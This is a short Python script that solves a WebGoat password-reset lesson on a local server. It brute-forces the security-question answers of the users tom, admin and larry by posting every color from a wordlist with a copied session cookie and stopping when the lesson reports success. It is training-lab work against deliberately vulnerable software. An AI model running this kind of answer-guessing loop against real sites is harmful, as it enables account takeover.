import requests


def main():
    with open("colors.txt", "r") as f:
        colors = f.read().splitlines()

    url = "http://127.0.0.1:8080/WebGoat/PasswordReset/questions"
    headers = {
        "Host": "127.0.0.1:8080",
        "Connection": "keep-alive",
        "Content-Length": "37",
        "sec-ch-ua": '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
        "Accept": "*/*",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-Requested-With": "XMLHttpRequest",
        "sec-ch-ua-mobile": "?0",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
        "sec-ch-ua-platform": '"Windows"',
        "Origin": "https://127.0.0.1:8080",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://127.0.0.1:8080/WebGoat/start.mvc?username=admin123",
        "Accept-Language": "en-US,en;q=0.9",
        "Cookie": "JSESSIONID=Shqk5FyjeDs_BGdHvCSk0wfthjNx2JqjZ8fcKSiX",
    }

    for name in ["tom", "admin", "larry"]:
        for color in colors:
            params = "username=" + name + "&securityQuestion=" + color
            response = requests.post(url, headers=headers, data=params)

            if response.json()["lessonCompleted"] == True:
                print(f"Username: {name}, Color: {color}")
                break


main()
